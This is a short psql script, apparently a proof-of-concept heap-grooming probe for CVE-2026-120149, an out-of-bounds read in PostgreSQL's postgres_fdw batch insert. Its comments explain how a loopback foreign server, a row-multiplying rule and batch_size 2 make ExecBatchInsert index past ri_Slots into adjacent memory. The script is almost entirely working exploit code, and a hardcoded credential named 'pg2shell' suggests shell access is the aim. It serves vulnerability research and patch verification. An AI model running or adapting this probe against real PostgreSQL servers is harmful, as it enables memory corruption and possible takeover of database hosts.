-- Bounded groom probe for CVE-2026-120149 (loopback only).
-- batch_size=2 => ri_Slots is a 2-pointer palloc; ri_PlanSlots is palloc'd
-- immediately after it, so OOB indices 2..3 alias ri_PlanSlots[0..1] (valid
-- slot pointers) instead of the zero tail seen with batch_size=10.
-- The remote rule expands each of 2 sent rows into 12, so the FDW reports
-- numInserted=24 and ExecBatchInsert walks indices 0..23.
\set ON_ERROR_STOP off
CREATE EXTENSION IF NOT EXISTS postgres_fdw;
DROP FOREIGN TABLE IF EXISTS ftable;
DROP TABLE IF EXISTS batch_table, batch_rule_table;
CREATE TABLE batch_table (x int);
CREATE TABLE batch_rule_table (x int);
CREATE RULE batch_rule AS ON INSERT TO batch_table
  DO INSTEAD INSERT INTO batch_rule_table SELECT i FROM generate_series(1,12) i;
CREATE SERVER IF NOT EXISTS loopback FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host '127.0.0.1', port '5432', dbname 'postgres');
CREATE USER MAPPING IF NOT EXISTS FOR postgres SERVER loopback
  OPTIONS (user 'postgres', password 'pg2shell');
CREATE FOREIGN TABLE ftable (x int) SERVER loopback
  OPTIONS (table_name 'batch_table', batch_size '2');
\echo == GROOM PROBE: 2 rows sent, rule reports 24, batch_size 2 ==
INSERT INTO ftable VALUES (1), (2);
\echo == RULE-TABLE COUNT ==
SELECT COUNT(*) FROM batch_rule_table;
\echo == END GROOM PROBE ==
